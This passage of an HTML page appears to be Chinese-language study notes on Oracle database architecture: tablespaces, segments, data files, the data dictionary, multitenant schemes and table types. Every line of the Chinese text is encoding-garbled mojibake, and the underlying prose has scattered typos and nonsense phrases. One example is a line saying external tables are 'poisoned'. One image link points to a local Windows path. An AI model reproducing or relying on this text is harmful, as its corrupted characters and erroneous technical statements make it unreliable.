title="æ•°æ®åº“é€»è¾‘ç»“æ„"></a>æ•°æ®åº“é€»è¾‘ç»“æ„</h5><blockquote><p>é€»è¾‘å­˜å‚¨ç»“æ„</p></blockquote><p>æ•°æ®åº“(Database)-&gt;è¡¨ç©ºé—´(Tablespace)-&gt;æ®µ(Segment)-&gt;åŒº(Extend)-&gt;æ•°æ®å—(Data Block)</p><blockquote><p>è¡¨ç©ºé—´</p></blockquote><p>æ˜¯åœ¨æ•°æ®åº“ä¸‹çš„å®šçº§ç»“æ„å•å…ƒï¼Œç”¨äºå­˜å‚¨å„ç§æ•°æ®åº“å¯¹è±¡çš„æ®µæ•°æ®</p><p>è¡¨ç©ºé—´ç±»å‹ï¼š</p><ul><li>SYSTEMè¡¨ç©ºé—´ï¼šç”¨äºå­˜å‚¨æ•´ä¸ªæ•°æ®åº“çš„å…ƒæ•°æ®å’Œç³»ç»Ÿè¿è¡Œæ•°æ®</li><li>STSAUXè¡¨ç©ºé—´ï¼šç”¨äºå­˜å‚¨è½¯ä»¶é€‰ä»¶åŠŸèƒ½æ¨¡å—ä½¿ç”¨æ•°æ®</li><li>TEMPè¡¨ç©ºé—´ï¼šç”¨äºå­˜å‚¨ä¸´æ—¶å¯¹è±¡æ•°æ®</li><li>UNDOè¡¨ç©ºé—´ï¼šç”¨äºå­˜å‚¨æ•°æ®åº“è¿˜åŸæ•°æ®ï¼Œä»¥ä¾¿è¿›è¡Œæ¢å¤å¤„ç†</li><li>USERSè¡¨ç©ºé—´ï¼šç”¨äºå­˜å‚¨ç”¨æˆ·å’Œåº”ç”¨æ•°æ®</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113144227499.png" alt="image-20231113144227499" style="zoom: 50%;" /><blockquote><p>æ®µ</p></blockquote><p>è¡¨ç©ºé—´ä¸­åˆ’åˆ†çš„ä¸åŒå­˜å‚¨åŒºåŸŸï¼Œä¾‹å¦‚è¡¨ç©ºé—´åˆ’åˆ†ä¸ºå­˜æ”¾æ•°æ®çš„æ•°æ®æ®µï¼Œå­˜æ”¾ä¸´æ—¶æ•°æ®çš„ä¸´æ—¶æ®µå’Œå­˜æ”¾å›æ»šæ•°æ®çš„å›æ»šæ®µã€‚</p><blockquote><p>åŒº</p></blockquote><p>ç”±è‹¥å¹²è¿ç»­æ•°æ®å—ç»„æˆçš„å­˜å‚¨åŒºï¼Œç”¨äºå­˜æ”¾ç‰¹å®šæ•°æ®ç±»å‹çš„æ•°æ®ã€‚å¯¹è±¡åˆ†é…ç©ºé—´æ˜¯ä»¥åŒºä¸ºå•ä½çš„ï¼Œä¸€ä¸ªæ•°æ®åº“å¯¹è±¡è‡³å°‘åŒ…å«ä¸€ä¸ªåŒºã€‚æ¯ä¸ªåŒºåˆç”±å¤šä¸ªæ•°æ®å—ç»„æˆã€‚</p><blockquote><p>æ•°æ®å—</p></blockquote><p>æ˜¯æ•°æ®åº“å­˜å–çš„æœ€å°å­˜å‚¨å•å…ƒï¼Œç”±è‹¥å¹²æ•°æ®å­—èŠ‚ç»„æˆã€‚é€šå¸¸Oracleæ•°æ®å—æ˜¯æ“ä½œç³»ç»Ÿæ•°æ®å—çš„å€æ•°</p><h5 id="æ•°æ®åº“ç‰©ç†ç»“æ„"><a href="#æ•°æ®åº“ç‰©ç†ç»“æ„" class="headerlink" title="æ•°æ®åº“ç‰©ç†ç»“æ„"></a>æ•°æ®åº“ç‰©ç†ç»“æ„</h5><p>æ•°æ®åº“ç‰©ç†ç»“æ„å¦‚ä¸‹ï¼š</p><ul><li>æ•°æ®æ–‡ä»¶(xxx.DBF)    -&gt;   å­˜å‚¨æ•°æ®åº“å¯¹è±¡ç»“æ„åŠå…¶æ•°æ®</li><li>æ§åˆ¶æ–‡ä»¶(xxx.CTL)     -&gt;   è®°å½•æ•°æ®åº“æ–‡ä»¶ä½ç½®ã€æ•°æ®åº“åç§°ã€åˆ›å»ºæ—¶é—´å’Œæ—¥å¿—è®°å½•åºå·ç­‰æ§åˆ¶ä¿¡æ¯</li><li>é‡åšæ—¥å¿—æ–‡ä»¶(xxx.LOG)    -&gt;    è®°å½•æ•°æ®åº“äº‹åŠ¡çš„æ—¥å¿—ä¿¡æ¯ã€‚æ•°æ®åº“è¢«ç ´åæ—¶ï¼Œå¯ä»¥åˆ©ç”¨æ—¥å¿—æ–‡ä»¶çš„æ•°æ®æ¥æ¢å¤æ•°æ®åº“</li></ul><h4 id="æ•°æ®å­—å…¸"><a href="#æ•°æ®å­—å…¸" class="headerlink" title="æ•°æ®å­—å…¸"></a>æ•°æ®å­—å…¸</h4><blockquote><p>åœ¨Oracleæ•°æ®åº“åº“ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿæ•°æ®åº“ä¿¡æ¯ã€æ•°æ®åº“å¯¹è±¡ä¿¡æ¯å’Œç”¨æˆ·ç®¡ç†ä¿¡æ¯ç­‰å…ƒæ•°æ®éƒ½éœ€è¦åœ¨æ•°æ®åº“ä¸­è¿›è¡Œè®°å½•ï¼Œä»¥ä¾¿åœ¨è¿è¡Œä¸­ä½¿ç”¨ã€‚</p></blockquote><p>åœ¨Oracleæ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œæ•°æ®åº“å‡ºç”¨æ¥å­˜å‚¨ç”¨æˆ·æ•°æ®å¤–ï¼Œè¿˜ä¼šä½¿ç”¨ç³»ç»Ÿæ•°æ®è¡¨å­˜æ”¾ç³»ç»Ÿå…ƒæ•°æ®ã€‚é€šå¸¸å°†æ•°æ®åº“ä¸­<strong>å­˜æ”¾ç³»ç»Ÿå…ƒæ•°æ®çš„æ•°æ®åº“è¡¨åŠå…¶è§†å›¾é›†åˆ</strong>ç§°ä¸ºæ•°æ®å­—å…¸ã€‚å­˜æ”¾åœ¨SYSTEMè¡¨ç©ºé—´ï¼Œç”¨é€”ä¸ºï¼š</p><ul><li>é€šè¿‡å­˜å–æ•°æ®å­—å…¸ï¼Œå¯è®¿é—®æ•°æ®åº“ä¸­æ‰€æœ‰æ•°æ®åº“å¯¹è±¡åŠå…¶å­˜å‚¨ç»“æ„ä¿¡æ¯</li><li>å½“ç³»ç»Ÿæ‰§è¡Œæ•°æ®åº“å¯¹è±¡æ“ä½œçš„DDLè¯­å¥åï¼Œåœ¨æ•°æ®å­—å…¸ä¸­è®°å½•ä¸ç»´æŠ¤è¯¥å¯¹è±¡çš„å…ƒæ•°æ®</li></ul><h5 id="é™æ€æ•°æ®å­—å…¸è§†å›¾"><a href="#é™æ€æ•°æ®å­—å…¸è§†å›¾" class="headerlink" title="é™æ€æ•°æ®å­—å…¸è§†å›¾"></a>é™æ€æ•°æ®å­—å…¸è§†å›¾</h5><table><thead><tr><th align="center">å‰ç¼€</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">ALL_</td><td align="center">æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®ï¼Œåªè¦æä¾›ç”¨æˆ·æœ‰å…³çš„å¯¹è±¡ä¿¡æ¯</td></tr><tr><td align="center">DBA_</td><td align="center">ä»…æœ‰DBAè®¿é—®ï¼Œä¸»è¦æä¾›ç³»ç»Ÿå’Œå¯¹è±¡ä¿¡æ¯</td></tr><tr><td align="center">USER_</td><td align="center">ä»…æœ‰æ•°æ®åº“ç”¨æˆ·è®¿é—®ï¼Œå†…å®¹å› ç”¨æˆ·è€Œä¸åŒ</td></tr></tbody></table><p>ä¸€èˆ¬åç§°å°¾éƒ¨è¿˜æœ‰$å­—ç¬¦ã€‚</p><h5 id="åŠ¨æ€æ•°æ®å­—å…¸è§†å›¾"><a href="#åŠ¨æ€æ•°æ®å­—å…¸è§†å›¾" class="headerlink" title="åŠ¨æ€æ•°æ®å­—å…¸è§†å›¾"></a>åŠ¨æ€æ•°æ®å­—å…¸è§†å›¾</h5><p>ä¸»è¦æä¾›æ•°æ®åº“è¿è¡ŒçŠ¶æ€æ•°æ®æŸ¥çœ‹ï¼Œå¦‚å½“å‰æ•°æ®åº“å†…å­˜ä½¿ç”¨ä¸åˆ†é…ä¿¡æ¯ã€‚æ–‡ä»¶çŠ¶æ€ä¿¡æ¯ã€ä»»åŠ¡è°ƒåº¦ä¸ä½œä¸šè¿›å±•ä¿¡æ¯ç­‰ã€‚ä¸»è¦æ˜¯ä»¥V$æˆ–V_$ä¸ºå‰ç¼€</p><h4 id="æ•°æ®åº“æ“ä½œè¯­è¨€"><a href="#æ•°æ®åº“æ“ä½œè¯­è¨€" class="headerlink" title="æ•°æ®åº“æ“ä½œè¯­è¨€"></a>æ•°æ®åº“æ“ä½œè¯­è¨€</h4><blockquote><p>SQLè¯­è¨€</p></blockquote><p>Oracleå¯¹æ ‡å‡†SQLè¿›è¡Œäº†æ‰©å±•ã€‚æ‰©å±• çš„Oracle SQLè¯­å¥å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><ul><li>å¯¹è±¡å®šä¹‰è¯­è¨€è¯­å¥(Data Definition Language ,DDL)</li><li>æ•°æ®åº“æ“çºµè¯­è¨€è¯­å¥(Data Manipulation Languageï¼ŒDML)</li><li>äº‹åŠ¡æ§åˆ¶è¯­å¥(Transacation Control Statements)</li><li>ä¼šè¯æ§åˆ¶è¯­å¥(Session Control Statements)</li><li>ç³»ç»Ÿæ§åˆ¶è¯­å¥(System Control Statement)</li><li>åµŒå…¥SQLè¯­å¥(Embedded SQL Statements)</li></ul><blockquote><p>PL&#x2F;SQLè¯­è¨€</p></blockquote><p>æ˜¯Oracleæ•°æ®åº“åœ¨SQLè¯­è¨€åŸºç¡€ä¸Šè¿›è¡Œè¿‡ç¨‹æ‰©å±•å¤„ç†çš„ç¼–ç¨‹è¯­è¨€ï¼Œæ”¯æŒæ‰€æœ‰Oracleçš„SQLè¯­å¥ï¼Œå‡½æ•°å’Œæ•°æ®ç±»å‹ï¼Œå¹¶èƒ½è¿›è¡Œå¾ªç¯ã€åˆ†æ”¯å’ŒåµŒå¥—ç­‰è¿‡ç¨‹ç¼–ç¨‹å¤„ç†ã€‚</p><blockquote><p>JAVAè¯­è¨€</p></blockquote><p>åç«¯æ•°æ®åº“ç¨‹åºç¼–ç¨‹é™¤äº†ä½¿ç”¨PL&#x2F;SQLè¯­è¨€å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨JAVAè¿›è¡Œè¿‡ç¨‹ç¼–ç¨‹å¤„ç†ã€‚Oracleæ•°æ®åº“æ”¯æŒJAVAåº”ç”¨å¼€å‘ã€éƒ¨ç½²å’Œå­˜å‚¨ã€‚</p><hr><h2 id="æ•°æ®åº“ä¸è¡¨ç©ºé—´"><a href="#æ•°æ®åº“ä¸è¡¨ç©ºé—´" class="headerlink" title="æ•°æ®åº“ä¸è¡¨ç©ºé—´"></a>æ•°æ®åº“ä¸è¡¨ç©ºé—´</h2><h3 id="æ•°æ®åº“-1"><a href="#æ•°æ®åº“-1" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h3><p>å®Œæ•´çš„Oracleæ•°æ®åº“é€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šOracleæ•°æ®åº“å’Œæ•°æ®åº“å®ä¾‹ã€‚ </p><ul><li>æ•°æ®åº“æ˜¯ä¸€ç³»åˆ—ç‰©ç†æ–‡ä»¶çš„é›†åˆï¼ˆæ•°æ®æ–‡ä»¶ï¼Œæ§åˆ¶æ–‡ä»¶ï¼Œè”æœºæ—¥å¿—ï¼Œå‚æ•°æ–‡ä»¶ç­‰ï¼‰ï¼› </li><li>Oracleæ•°æ®åº“å®ä¾‹åˆ™æ˜¯ä¸€ç»„Oracleåå°è¿›ç¨‹&#x2F;çº¿ç¨‹ä»¥åŠåœ¨æœåŠ¡å™¨åˆ†é…çš„å…±äº«å†…å­˜åŒºã€‚</li></ul><p>åœ¨å¯åŠ¨Oracleæ•°æ®åº“æœåŠ¡å™¨æ—¶ï¼Œå®é™…ä¸Šæ˜¯åœ¨æœåŠ¡å™¨çš„å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªOracleå®ä¾‹ï¼ˆå³åœ¨æœåŠ¡å™¨å†…å­˜ä¸­åˆ†é…å…±äº«å†…å­˜å¹¶åˆ›å»ºç›¸å…³çš„åå°å†…å­˜ï¼‰ï¼Œç„¶åç”±è¿™ä¸ªOracleæ•°æ®åº“å®ä¾‹æ¥è®¿é—®å’Œæ§åˆ¶ç£ç›˜ä¸­çš„æ•°æ®æ–‡ä»¶ã€‚Oracleæœ‰ä¸€ä¸ªå¾ˆå¤§çš„å†…å­˜å¿«ï¼Œæˆä¸ºå…¨å±€åŒºï¼ˆSGAï¼‰ã€‚</p><h4 id="æ™®é€šæ•°æ®åº“"><a href="#æ™®é€šæ•°æ®åº“" class="headerlink" title="æ™®é€šæ•°æ®åº“"></a>æ™®é€šæ•°æ®åº“</h4><p>ä»ç‰©ç†ç»“æ„æ¥çœ‹ï¼ŒOracleæ•°æ®åº“ç”±è‹¥å¹²æ–‡ä»¶ç»„æˆï¼Œä¸»è¦åŒ…æ‹¬&#x3D;&#x3D;æ•°æ®æ–‡ä»¶ã€æ§åˆ¶æ–‡ä»¶å’Œæ—¥å¿—æ–‡ä»¶&#x3D;&#x3D;ã€‚åˆ›å»ºæ•°æ®åº“å®é™…ä¸Šå°±æ˜¯åœ¨æ“ä½œç³»ç»Ÿä¸­å»ºç«‹è¿™äº›æ•°æ®åº“æ–‡ä»¶ï¼Œä»¥ä¾¿æ•°æ®åº“æœåŠ¡å™¨åˆ©ç”¨è¿™äº›æ–‡ä»¶å¯¹æ•°æ®åº“è¿›è¡Œæ•°æ®å­˜å‚¨ä¸ç®¡ç†ã€‚</p><h4 id="å¤šç§Ÿæˆ·æ•°æ®åº“"><a href="#å¤šç§Ÿæˆ·æ•°æ®åº“" class="headerlink" title="å¤šç§Ÿæˆ·æ•°æ®åº“"></a>å¤šç§Ÿæˆ·æ•°æ®åº“</h4><p>åœ¨äº‘è®¡ç®—æœåŠ¡é¢†åŸŸä¸­ï¼Œå¤šç§Ÿæˆ·æŠ€æœ¯æ˜¯æŒ‡å¤šä¸ªç§Ÿæˆ·å…±ç”¨ä¸€ä¸ªç›¸åŒçš„åº”ç”¨æˆ–æœåŠ¡æ—¶ï¼Œä»å¯ç¡®ä¿ç”¨æˆ·ä¹‹é—´çš„æ•°æ®éš”ç¦»ã€‚äº‘æœåŠ¡è½¯ä»¶ä¸ä¼ ç»Ÿè½¯ä»¶çš„æ•°æ®åº“å®ç°æŠ€æœ¯çš„åŒºåˆ«åœ¨äºäº‘æœåŠ¡è½¯ä»¶é‡‡ç”¨äº†å¤šç§Ÿæˆ·æ•°æ®åº“æ¨¡å¼æŠ€æœ¯è§£å†³ç§Ÿæˆ·ä¹‹é—´çš„æ•°æ®éš”ç¦»ã€‚åœ¨å¤šç§Ÿæˆ·æ•°æ®åº“æ¨¡å¼ä¸‹ï¼Œå„ä¸ªç§Ÿæˆ·è™½ç„¶è¿è¡Œåœ¨åŒä¸€æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œä½†å®ƒä»¬åªèƒ½æŸ¥çœ‹å’Œä¿®æ”¹è‡ªå·±çš„æ•°æ®é›†åˆï¼Œç§Ÿæˆ·ä¹‹é—´ç›¸äº’ç‹¬ç«‹ï¼Œå½¼æ­¤äº’ä¸å½±å“ã€‚å®ç°å¤šç§Ÿæˆ·æ•°æ®åº“æ¨¡å¼ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ–¹æ¡ˆ</p><p>&#x3D;&#x3D;ç§Ÿæˆ·ä½¿ç”¨ç‹¬ç«‹æ•°æ®åº“&#x3D;&#x3D;</p><p>æ¯ä¸ªç§Ÿæˆ·åœ¨ä½¿ç”¨åº”ç”¨ç³»ç»ŸæœåŠ¡æ—¶ï¼Œé‡‡ç”¨å„è‡ªç‹¬ç«‹çš„æ•°æ®åº“è§£å†³ç§Ÿæˆ·ä¹‹é—´çš„æ•°æ®éš”ç¦»é—®é¢˜ã€‚</p><p>ç‰¹ç‚¹æ˜¯ï¼šæœ‰åŠ©äºæ•°æ®æ¨¡å‹çš„æ‹“å±•è®¾è®¡ï¼Œæ»¡è¶³ä¸åŒç§Ÿæˆ·çš„ç‹¬ç‰¹éœ€æ±‚ï¼Œç”¨æˆ·æ•°æ®éš”ç¦»çº§åˆ«æœ€é«˜ï¼Œå®‰å…¨æ€§æœ€å¥½ï¼Œä½†æˆæœ¬é«˜</p><p>&#x3D;&#x3D;ç§Ÿæˆ·å…±äº«æ•°æ®åº“ã€éš”ç¦»Schema&#x3D;&#x3D;</p><p>ç§Ÿæˆ·ä½¿ç”¨åº”ç”¨ç³»ç»ŸæœåŠ¡æ—¶ï¼Œé‡‡ç”¨ç»Ÿä¸€æ•°æ®åº“ï¼Œåœ¨æ•°æ®åº“ä¸­é€šè¿‡ä¸åŒçš„ç”¨æˆ·Schemaè§£å†³ç§Ÿæˆ·ä¹‹é—´çš„æ•°æ®éš”ç¦»é—®é¢˜ã€‚</p><p>ç‰¹ç‚¹æ˜¯ï¼šä¸ºå®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„ç§Ÿæˆ·æä¾›äº†ä¸€å®šç¨‹åº¦çš„é€»è¾‘æ•°æ®éš”ç¦»ï¼Œä½†å¹¶ä¸æ˜¯å®Œå…¨éš”ç¦»ï¼›å¦‚æœå‡ºç°æ•…éšœï¼Œæ•°æ®æ¢å¤æ¯”è¾ƒå›°éš¾ï¼Œå› ä¸ºæ¢å¤æ•°æ®åº“å°†ç‰µæ‰¯åˆ°å…¶ä»–ç§Ÿæˆ·çš„æ•°æ®ï¼›å¦‚æœéœ€è¦è·¨ç§Ÿæˆ·ç»Ÿè®¡æ•°æ®ï¼Œä¹Ÿå­˜åœ¨ä¸€å®šçš„å›°éš¾ã€‚</p><p>&#x3D;&#x3D;ç§Ÿæˆ·å…±äº«æ•°æ®åº“ã€å…±äº«Schema&#x3D;&#x3D;</p><p>ç§Ÿæˆ·å…±äº«æ•°æ®åº“ã€å…±äº«Schemaï¼Œä½†åœ¨è¡¨ä¸­ç«¥å¹´è¿‡Ten-andIDè§£å†³ç§Ÿæˆ·ä¹‹é—´çš„æ•°æ®éš”ç¦»ã€‚</p><p>ç‰¹ç‚¹æ˜¯ï¼šå…±äº«ç¨‹åº¦æœ€é«˜ï¼Œéš”ç¦»çº§åˆ«æœ€ä½ï¼Œéœ€è¦åœ¨è®¾è®¡å¼€å‘æ—¶åŠ å¤§å¯¹å®‰å…¨å¤„ç†çš„å¼€å‘é‡ï¼›æ•°æ®å¤‡ä»½å’Œæ¢å¤æœ€éš¾ï¼Œéœ€è¦é€è¡¨é€æ¡å¤‡ä»½è¿˜åŸã€‚</p><h5 id="æ¨¡å¼"><a href="#æ¨¡å¼" class="headerlink" title="æ¨¡å¼"></a>æ¨¡å¼</h5><p>åœ¨oracleæ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œå®¹å™¨æ•°æ®åº“ (Container Databaseï¼ŒCDB) æ˜¯æŒ‡èƒ½å¤Ÿå®¹çº³0ä¸ªã€1ä¸ªæˆ–å¤šä¸ªæ’æ¥å¼æ•°æ®åº“(Pluggable Databasesï¼ŒPDB)çš„æ•°æ®åº“ã€‚ç»“æ„å¦‚ä¸‹å›¾</p><img src="C:/Users/%E6%9D%A8%E6%AC%A3%E7%84%B6/AppData/Roaming/Typora/typora-user-images/image-20240110172647830.png" alt="image-20240110172647830" style="zoom: 33%;" /><h4 id="æ•°æ®è¡¨ç©ºé—´"><a href="#æ•°æ®è¡¨ç©ºé—´" class="headerlink" title="æ•°æ®è¡¨ç©ºé—´"></a>æ•°æ®è¡¨ç©ºé—´</h4><p>åœ¨oracleæ•°æ®åº“é€»è¾‘ç»“æ„ä¸­ï¼Œè¡¨ç©ºé—´æ˜¯æ•°æ®åº“ä¹‹ä¸­æœ€é«˜å±‚æ¬¡çš„é€»è¾‘å­˜å‚¨ç»“æ„ï¼Œå³æ•°æ®åº“æ˜¯ç”±è‹¥å¹²è¡¨ç©ºé—´æ„æˆã€‚åœ¨åˆ›å»ºæ•°æ®åº“æ—¶ï¼Œç³»ç»Ÿè‡ªåŠ¨ä¸ºæ¯ä¸ªæ•°æ®åº“å»ºç«‹å‡ ä¸ªé»˜è®¤çš„è¡¨ç©ºé—´ï¼Œæ­¤å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥ä¸ºåº”ç”¨åˆ›å»ºåŠç®¡ç†è‡ªå·±çš„è¡¨ç©ºé—´ã€‚</p><p>è¡¨ç©ºé—´æ˜¯ä¸€ç§é€»è¾‘å®¹å™¨ï¼Œå®ƒç”¨äºç»„ç»‡å„ç§æ•°æ®åº“å¯¹è±¡(è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€å­˜å‚¨è¿‡ç¨‹è§¦å‘å™¨ç­‰)çš„é€»è¾‘å­˜å‚¨ï¼Œå¹¶ç®¡ç†ç›¸å…³çš„æ•°æ®æ–‡ä»¶ã€‚è¡¨ç©ºé—´åœ¨oracleæ•°æ®åº“çš„é€»è¾‘ç»“æ„ç»„ç»‡å’Œç‰©ç†ç»“æ„ç®¡ç†ä¸­æ‰®æ¼”é‡è¦çš„ä½œç”¨</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110174844718.png" alt="image-20240110174844718" style="zoom: 33%;" /><p>Oracleæ•°æ®åº“æ˜¯<strong>é€šè¿‡è¡¨ç©ºé—´æ¥å­˜å‚¨ç‰©ç†è¡¨</strong>çš„ï¼Œä¸€ä¸ªæ•°æ®åº“å®ä¾‹å¯ä»¥æœ‰Nä¸ªè¡¨ç©ºé—´ï¼Œä¸€ä¸ªè¡¨ç©ºé—´ä¸‹å¯ä»¥æœ‰Nå¼ è¡¨ã€‚</p><p>æ•°æ®æ–‡ä»¶æ˜¯ç‰©ç†çš„ï¼Œä¸€ä¸ªè¡¨ç©ºé—´å¯ä»¥åŒ…å«å¤šä¸ªæ•°æ®æ–‡ä»¶ï¼Œè€Œä¸€ä¸ªæ•°æ®æ–‡ä»¶åªèƒ½éš¶å±ä¸€ä¸ªè¡¨ç©ºé—´ã€‚</p><p>åˆ›å»ºè¡¨ç©ºé—´è¯­æ³•ï¼š</p><p><code>Create TableSpace è¡¨ç©ºé—´åç§° DataFile  è¡¨ç©ºé—´æ•°æ®æ–‡ä»¶è·¯å¾„ Size è¡¨ç©ºé—´åˆå§‹å¤§å° Autoextend on</code></p><p>æŸ¥çœ‹å·²ç»åˆ›å»ºå¥½çš„è¡¨ç©ºé—´ï¼š</p><p><code>select default_tablespace, temporary_tablespace, d.username   from dba_users d</code></p><h2 id="æ•°æ®åº“å¯¹è±¡"><a href="#æ•°æ®åº“å¯¹è±¡" class="headerlink" title="æ•°æ®åº“å¯¹è±¡"></a>æ•°æ®åº“å¯¹è±¡</h2><p>æ•°æ®åº“å¯¹è±¡æ˜¯æ„æˆæ•°æ®åº“çš„ç»„æˆå…ƒç´ ã€‚ä¸€ä¸ªOracleæ•°æ®åº“å¯ä»¥å­˜å‚¨å¤šç§ç±»å‹å¯¹è±¡ï¼Œå¦‚è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€å¤„å¤„è¿‡ç¨‹ã€è§¦å‘å™¨ã€åºåˆ—ã€åŒä¹‰è¯å’ŒåŒ…ç­‰ã€‚åœ¨ä½¿ç”¨oracleæ•°æ®åº“å‰ï¼Œå¿…é¡»åœ¨æ•°æ®åº“ä¸­åˆ›å»ºåŸºæœ¬çš„æ•°æ®åº“å¯¹è±¡ï¼Œå¹¶ç”±ä¸åŒç”¨æˆ·schemaåˆ†åˆ«ç»„ç»‡è¿™äº›å¯¹è±¡é›†åˆã€‚å½“åœ¨æ•°æ®åº“ä¸­åˆ›å…³é”®è¡¨å¯¹è±¡åï¼Œå°±å¯ä»¥å¯¹è¡¨å¯¹è±¡è¿›è¡Œæ•°æ®å¢åˆ æ”¹æŸ¥è®¿é—®æ“ä½œã€‚</p><h3 id="æ•°æ®åº“è¡¨"><a href="#æ•°æ®åº“è¡¨" class="headerlink" title="æ•°æ®åº“è¡¨"></a>æ•°æ®åº“è¡¨</h3><p>è¡¨æ˜¯å…³ç³»æ•°æ®åº“ä¸­æœ€åŸºæœ¬çš„æ•°æ®åº“å¯¹è±¡ï¼Œå®ƒæ˜¯å­˜å‚¨æ•°æ®çš„åŸºæœ¬é€»è¾‘å®¹å™¨ã€‚ä¸€ä¸ªæˆ‘è®©è½¦å¼€äº†å…³ç³»æ•°æ®åº“é€šå¸¸éœ€è¦å»ºç«‹è¾ƒå¤šçš„è¡¨ã€‚å…¶ä¸­ä¸€äº›ç”¨äºå­˜å‚¨æè¿°æ•°æ®åº“ç»“æ„çš„å…ƒæ•°æ®å’Œç³»ç»Ÿè¿è¡Œæ•°æ®ï¼Œè¿™äº›è¢«ç§°ä¸º<strong>ç³»ç»Ÿè¡¨æˆ–æ•°æ®å­—å…¸</strong>ã€‚å¦å¤–ä¸€äº›è¡¨ç”¨äºå­˜å‚¨ç”¨æˆ·çš„åº”ç”¨æ•°æ®ï¼Œè¿™äº›è¡¨è¢«ç»Ÿç§°ä¸º<strong>ç”¨æˆ·è¡¨</strong>ã€‚</p><h4 id="è¡¨ç±»å‹"><a href="#è¡¨ç±»å‹" class="headerlink" title="è¡¨ç±»å‹"></a>è¡¨ç±»å‹</h4><p>&#x3D;&#x3D;å…³ç³»è¡¨&#x3D;&#x3D;</p><p>å…³ç³»è¡¨æ˜¯oracleæ•°æ®åº“ä¸­ä½¿ç”¨æœ€å¤šçš„ä¸€ç±»æ•°æ®åº“è¡¨ã€‚è¯¥ç±»è¡¨æŒ‰ç…§å…³ç³»æ¨¡å‹æ–¹å¼å¤„ç†æ•°æ®è®¿é—®ã€‚åœ¨åˆ›å»ºoracleå…³ç³»è¡¨æ—¶ï¼Œé»˜è®¤æŒ‰å †æ–¹å¼å­˜å‚¨æ•°æ®ï¼Œæœ‰æ—¶ä¹Ÿå°†å®ƒç§°ä¸ºå †ã€‚åœ¨ç”¨å †æ–¹å¼å­˜å‚¨æ•°æ®æ—¶ï¼Œè¡¨ä¸­çš„è¡Œæ•°æ®ç”±B-æ ‘ç´¢å¼•æŒ‡é’ˆå®šä½ï¼Œè¯¥è¡Œæ•°æ®å¯åœ¨ç£ç›˜å—ä¸­ä»»æ„é¡ºåºä½ç½®å­˜æ”¾ã€‚</p><p>&#x3D;&#x3D;å¯¹è±¡è¡¨&#x3D;&#x3D;</p><p>å¯¹è±¡è¡¨æ˜¯ä¸€ç§åœ¨oracleæ•°æ®åº“ä¸­ä»¥å¯¹è±¡æ•°æ®ç±»å‹æ–¹å¼æ‰€åˆ›å»ºçš„è¡¨ã€‚å¯¹è±¡è¡¨ä¸­ï¼Œæ¯è¡Œåˆ†åˆ«å‚¨å­˜å¤„ä¸åŒç”¨æˆ·çš„æ•°æ®ã€‚</p><p>&#x3D;&#x3D;ä¸´æ—¶è¡¨&#x3D;&#x3D;</p><p>ä¸´æ—¶è¡¨ä¸å¸¸è§„è¡¨(å…³ç³»è¡¨ã€‚å¯¹è±¡è¡¨)ä¸€æ ·ä¹Ÿæ˜¯ç”¨äºå­˜å‚¨æ•°æ®çš„è¡¨å¯¹è±¡ï¼Œä½†æ˜¯ä¸´æ—¶è¡¨åœ¨æ•°æ®åº“ä¸­ä»…ç”¨äºæ®‹å­˜æ•°æ®ã€‚å½“æ•°æ®åº“å®ä¾‹ç§æ¤åï¼Œç³»ç»Ÿå°†æ¸…é™¤ä¸´æ—¶è¡¨åŠå…¶æ•°æ®ã€‚</p><p>&#x3D;&#x3D;ç´¢å¼•ç»„ç»‡è¡¨&#x3D;&#x3D;</p><p>ç´¢å¼•ç»„ç»‡è¡¨æŒ‰ç…§è¡¨çš„é€æ¸ç´¢å¼•å€¼é¡ºåºåœ¨ç£ç›˜å—ä¸­ç»„ç»‡è¿›è¡Œæ•°æ®å­˜å‚¨ï¼Œå¹¶ä¸”å°†è¡Œæ•°æ®å­˜æ”¾åœ¨ç´¢å¼•å¶ç»“ç‚¹å­˜å‚¨å—ä¸­ã€‚ç´¢å¼•ç»„ç»‡è¡¨æ”¯æŒåº”ç”¨å¯¹è¯¥è¡¨ä¸­è¿›è¡ŒèŒƒå›´æŸ¥è¯¢ï¼Œå¯å®ç°é«˜æ€§èƒ½è®¿é—®å’Œé«˜ç©ºå­˜å‚¨ç©ºé—´è®¿é—®ç‡ã€‚</p><p>&#x3D;&#x3D;å¤–éƒ¨è¡¨&#x3D;&#x3D;</p><p>å¤–éƒ¨è¡¨æ˜¯ä¸€ç±»åœ¨æ•°æ®åº“ä¸­å­˜å‚¨å…ƒæ•°æ®ï¼Œè€Œå¤–éƒ¨è¡¨æ•°æ®æœ¬èº«å­˜å‚¨åœ¨æ•°æ®åº“ä¹‹å¤–çš„æ–‡ä»¶ä¸­ã€‚å¤–éƒ¨è¡¨åœ¨æ•°æ®åº“ä¸­é€šå¸¸ä¸ºä¸­æ¯’ã€‚</p><h4 id="ç”¨æˆ·schema"><a href="#ç”¨æˆ·schema" class="headerlink" 